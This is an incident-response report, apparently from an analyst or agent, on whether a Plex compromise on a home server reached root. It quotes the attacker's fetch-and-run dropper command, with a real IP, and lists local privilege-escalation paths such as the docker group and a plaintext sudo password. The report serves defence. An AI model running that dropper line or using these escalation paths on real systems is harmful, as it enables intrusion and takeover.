# Did the Plex attacker get root on athena?

Checked 2026-10-17, 09:40–10:00 EDT, as `bryan` on athena (no root). I used live state
plus the sealed Gate A evidence from the incident plan `202610/athena_plex_compromise_response.md`.
This report goes beyond the earlier credential report
(`202610/athena_plex_breach_credential_exposure.md` in bob-cli's research repo, written
by agent `8h`).

## Short answer

**Very unlikely.** Every check I could run points to an attacker who stayed the `plex` user
(uid 998) the whole time, from 01:48 until containment at about 07:56. One root-only log
check is still left. It takes one minute and would close the question (see the end).

## Why it looks like no root

| Check | Result | What it means |
| --- | --- | --- |
| Implant's privileges when it was captured (07:56) | uid/gid 998 in every slot, **zero capabilities** | The live implant was not root |
| How the attacker kept access | Re-infected every hour through Plex's scanner loading the planted `.so`. Miner and bot dropped in world-writable `/tmp` | Attackers with root install root persistence. This one kept using a `plex`-only trick |
| What the dropper runs | One line: `wget`/`curl http://217.60.194.116/plex \| sh` | A commodity mining/DDoS campaign, not a hands-on intruder |
| Miner side effects | Huge pages = 0, kernel shows no MSR-write taint | The miner (XMRig) changes both when it runs as root. Neither changed |
| Changed system files since 01:45 | Nothing in `/etc`, `/usr`, `/boot`, `/root`, or `/opt`, except one PIA VPN data file and the incident files | No root backdoor, cron job, unit, or key was added |
| Root tripwires (Gate A) | `dpkg --verify` flags only config files. No new SUID files. No `/etc/ld.so.preload`. `passwd`/`shadow`/`sudoers` unchanged since March/September | Clean |
| Processes | No `su`/`sudo`/`pkexec` under the attacker's processes. The implant had no children. The only root processes started in the window were your own SSH logins and Gate A | No live escalation |
| Docker (`bryan` → root in one step) | Docker's event log since boot (Oct 15) shows only the Actual container starting at boot | The docker route was not used |
| SSH | Every interactive login recorded in the window was your Mac over Tailscale. sshd always requires a public key, so a stolen password alone can't log in | No attacker logins |
| Your shell | No `bryan` shell commands logged between 01:48 and 07:04 | No interactive `bryan` session |
| Patch level | sudo has the 2025 chroot/host CVE fixes. Kernel 6.12.111 (built Sep 28). polkit 126 | No obvious known exploit to use |

## What is not ruled out

- **The second-stage script was never captured.** The dropper downloads and runs a script
  from the attacker's server, so we don't know everything it tried.
- **The one realistic path to root:** your current sudo password sat in plain text in
  files `plex` could read (see `8h`'s report). With it, `plex` could run `su bryan`, then
  `sudo`. That leaves records only in `/var/log/auth.log`. The systemd journal for the
  window has already rotated away, and `auth.log` is root-only, so I couldn't read it.

## Close it out (your sudo, read-only, about one minute)

```sh
sudo grep -aE '^(2026-10-17T0[1-7]|Oct 17 0[1-7]:)' /var/log/auth.log \
  | grep -aE '\b(su|sudo|pkexec|polkitd|unix_chkpwd)(\[[0-9]+\])?:|uid=998|\bplex\b' \
  | grep -av sshd
sudo cat /sys/module/msr/parameters/allow_writes
```

- **Clean:** the first command prints nothing, or only your own Gate A `sudo` lines from
  about 07:50–07:58. The second prints `default`.
- **Rebuild athena** if you see any `su`, `sudo`, or `pkexec` line that mentions `plex` or
  `uid=998`, any `(to bryan)` or `(to root)` you didn't do, or if `allow_writes` prints
  `on`. XMRig sets `on` only when it runs as root.

Either way, change the athena password now. It was readable even if it was never used.

## Other local paths I found (not used this time)

- **SASE mobile gateway** (running during the window). Its pairing endpoints accept any
  local account, so a local attacker could get a token and launch agents as `bryan`. No
  device was paired, so it wasn't used. Filed as bead `sase-1mc`. Stop the gateway on
  athena until it's fixed.
- **Your supervisord and multivisor** listen without a password. They can start and stop
  your configured programs but can't run new commands.
- **Transmission's `settings.json`** is group-writable, and `plex` is in that group. That
  lets `plex` become `debian-transmission`, not root. The incident plan's Gate B
  removes `plex` from that group when the file is group-writable, and it is.
- **`docker` group membership is equivalent to root.** Anyone who becomes `bryan` is
  one command away from root.
